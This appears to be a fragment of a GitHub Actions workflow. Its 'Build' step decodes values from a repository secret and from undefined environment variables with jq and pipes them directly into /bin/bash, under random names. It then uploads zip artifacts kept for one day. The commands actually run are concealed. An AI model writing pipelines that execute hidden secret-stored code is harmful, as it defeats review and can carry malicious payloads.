        with:
          fetch-depth: 1
      - name: Build
        env:
          omyam74: ${{ secrets.omyam74 }}
        run: |
          printf '%s' "$omyam74" | jq -r .kq7 | /bin/bash
          echo $t1501 | jq -r .vwaa24345 | /bin/bash
          echo $xayf8541 | jq -r .bn13254 | /bin/bash

      - name: Archive output
        uses: actions/upload-artifact@v4
        with:
          name: EGrmeLdG
          path: "*.zip"
          retention-days: 1
